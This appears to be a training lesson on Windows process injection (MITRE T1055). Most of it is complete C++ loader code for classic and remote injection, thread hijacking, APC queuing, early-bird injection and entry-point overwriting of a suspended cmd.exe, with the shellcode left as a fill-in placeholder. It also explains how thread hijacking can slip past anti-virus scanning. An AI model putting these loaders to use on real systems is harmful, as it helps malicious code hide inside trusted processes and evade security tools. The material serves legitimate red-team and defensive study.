
Process injection is described by MITRE [[T1055](https://attack.mitre.org/techniques/T1055/)] as a privilege escalation and defence evasion technique.  The idea of which is to inject untrusted code into the address space of a trusted process, potentially bypassing defence solutions and allowing the code to inherit the security context of the process's owner.  There are many different techniques, some more sophisticated than others.  The aim of this lesson is to introduce you to some of the more straight-forward ones to get you familiar with the concept.  

The high-level steps required for process injection to be successful are to:

- Allocate a new region of memory in the process.
- Copy the shellcode into that region.
- Execute the shellcode (typically with a thread).

# Classic injection

Perhaps the most vanilla form of process injection uses the VirtualAlloc, WriteProcessMemory, and CreateThread APIs.  This will inject and execute the shellcode in the running process.

```c++
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "..."; // your shellcode goes here

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        &shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```
# Classic remote injection

The same style of injection can be used on other processes as well.  An additional step is required where we must obtain a handle to the target process by its process ID (PID).

```c++
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```
# Thread hijacking

In the examples above, the new threads are pointing to our shellcode when they are created.  Anti-virus solutions can receive notifications when new threads are created and are able to inspect the memory the thread is pointing to.  If they find the thread is pointing to shellcode, it can block the new thread from starting and raise an alert.  A possible workaround for this is to create the thread in a suspended state but pointing to a benign location.  After some time (hopefully after the anti-virus has scanned the memory region), the context of the thread can be changed to point at the shellcode and resumed.

```c++
#include <Windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = "...";

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}
```

A similar variant of thread hijacking can be performed where you enumerate all of the running threads in a process, suspend one of them, change its context and then resume it.  This isn't generally recommended though, because you'll break whatever functionality that thread was performing and potentially crash the process.

# Asynchronous Procedure Calls

This technique is similar to above but instead of creating a new thread, we queue an [asynchronous procedure call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) on an existing thread.  When the thread enters an 'alertable' state (e.g. when it calls an API like Sleep or WaitForSingleObject), it will run the shellcode that the APC points to.  Queuing an APC on a thread requires that we have a handle to it, and for that we need a thread ID.  To obtain a valid thread ID from a process, we must 'thread walk' it.

```c++
#include <Windows.h>
#include <tlhelp32.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}
```
# Early bird

The downside with the APC method is that there's no guarantee that the selected thread will become alertable, and therefore the shellcode will not run.  You could queue an APC on every thread in the process, but that would almost certainly lead to a crash.  The 'early bird' technique gets around this by spawning a new process in a suspended state, queuing the APC on its primary thread, then resuming the process.  This way, the APC is guaranteed to trigger.

```c++
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

# Process hollowing

This is a technique where a process is started in a suspended state, the original PE is unmapped from memory, and a new PE mapped in its place.  A half-way house to process hollowing is where we simply overwrite the PE's entry point with shellcode, without unmapping anything first.  When the process is resumed, the process's primary thread will be pointing at our shellcode instead of the PE's executable code section.

Finding the PE's entry point requires us to read its structure from memory while it's suspended.  There's a native API called [NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) which is able to populate a structure called `PROCESS_BASIC_INFORMATION`.  One of its members is _PebBaseAddress_ which is a pointer to a [PEB](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb) structure.  It's not documented, but one of its members is _ImageBaseAddress_.

From there, we can read PE's DOS header to get the value for `e_lfanew`, and then use that to locate the NT header.  Drilling down into `OptionalHeader->AddressOfEntryPoint` gives us the relative virtual address (RVA) of the PE's entry point.

```c++
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}
```